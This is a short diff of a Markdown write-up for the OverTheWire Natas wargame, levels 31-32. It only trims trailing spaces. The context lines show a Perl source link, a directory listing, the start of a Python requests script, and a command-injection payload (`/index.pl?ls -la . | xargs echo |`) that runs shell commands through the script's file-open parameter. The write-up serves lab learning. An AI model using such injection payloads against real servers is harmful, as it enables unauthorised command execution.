@@ -3442,7 +3442,7 @@ print(content)
 
 <img src="img/Pasted image 20240522195503.png" alt="Example Image" width="1080"/>
 
-We can upload , what are we want to ? ..... 
+We can upload , what are we want to ? .....
 Source View : [http://natas31.natas.labs.overthewire.org/index-source.html](http://natas31.natas.labs.overthewire.org/index-source.html)
 
 ```pl
@@ -3541,7 +3541,7 @@ But Got Nothing , let see pwd `/index.pl?ls -la . | xargs echo |` , `.` refers c
 </td></tr><tr><td>drwxr-x---  2 natas32 natas32  4096 May 22 14:48 tmp
 ```
 
-It looks like have a root access and name `getpassword` , again do same stuffs from above script 
+It looks like have a root access and name `getpassword` , again do same stuffs from above script
 
 ```py
 import requests
